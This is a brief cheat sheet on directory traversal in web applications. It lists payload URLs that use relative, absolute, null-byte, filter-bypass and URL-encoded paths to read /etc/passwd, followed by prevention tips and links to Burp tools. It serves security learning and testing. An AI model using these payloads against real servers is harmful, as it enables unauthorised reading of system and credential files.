# Directory traversal :open_file_folder:
Gain access to files and directories that are stored outside the web root directory.  This can be accomplished in a variety of ways for requests that take user supplied input and use it to retrieve a file:

```sh
# Relative path traversal
https://server.com/loadimage?filename=../../../etc/passwd

# Absolute path traversal
https://server.com/loadimage?filename=/etc/passwd

# Known start path with relative traversal
https://server.com/loadimage?filename=/var/www/images/../../../etc/passwd

# Relative path traversal with null byte
https://server.com/loadimage?filename=../../../etc/passwd%00.png

# Relative path traversal with escaped paths
https://server.com/loadimage?filename=....//....//....//etc/passwd
https://server.com/loadimage?filename=....\/....\/....\/etc/passwd

# Relative path traversal with URL encoded paths %2E%2E%2F == ../
https://server.com/loadimage?filename=%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc/passwd
```

## Prevent
* Do not allow user supplied input to be used to retrieve files.
* Strip all path traversal characters from user supplied input.
* Do not allow server process to read files outside of defined asset directories.
* Change file retrieval requests against safelist of allowed paths and files.

## Tools
* [Burp Proxy](https://portswigger.net/burp/documentation/desktop/tools/proxy)
* [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater)
* [BApp Store > Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)


## References
* https://portswigger.net/web-security/file-path-traversal